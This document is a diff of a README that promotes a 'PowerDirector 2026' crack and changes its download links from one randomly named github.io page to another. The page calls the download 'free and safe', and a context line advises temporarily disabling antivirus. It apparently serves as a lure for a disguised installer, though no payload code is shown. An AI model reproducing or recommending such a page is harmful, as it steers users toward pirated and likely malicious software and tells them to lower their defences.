@@ -2,7 +2,7 @@
 
 Welcome to the PowerDirector 2026 Ultimate Effects Pack, your go-to resource for unlocking premium video editing features with the powerdirector crack 2026. This tool provides an extensive collection of AI-powered effects, templates, and tools to enhance your creative projects on Windows desktops. Whether you're a professional editor or a hobbyist, this pack will elevate your videos to the next level.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -51,7 +51,7 @@ A5: Ensure you have administrator rights, disable any antivirus temporarily duri
 
 To get the latest version of the PowerDirector 2026 Ultimate Effects Pack, click the link below:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This download is free and safe for your Windows desktop. Enjoy enhancing your videos with premium effects and tools!
 
